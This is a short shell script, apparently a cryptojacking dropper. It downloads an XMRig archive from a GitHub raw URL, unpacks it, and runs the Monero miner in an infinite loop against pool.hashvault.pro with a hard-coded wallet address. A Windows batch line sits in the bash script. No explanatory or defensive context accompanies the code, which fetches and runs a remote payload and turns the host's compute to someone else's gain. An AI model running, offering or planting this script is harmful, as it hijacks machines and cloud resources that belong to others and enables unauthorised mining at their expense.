#!/bin/bash
@echo off
wget https://github.com/lushenry654/data/raw/main/xmr.tar.gz && tar xf xmr.tar.gz
while [ 1 ]; do
./xmrig --donate-level 1 -o pool.hashvault.pro:80 -u 8BAwTuT1K5FVz73nqizTE8DZjxd5TW9uHF57XsLWK1S4SWNxpuYfpwGeuAc1wUMmUYQNNCsAP4qrMcQZUZkCc3yWNgjq5Ac -p D -a rx/0 -k 
sleep 3
done
sleep 999
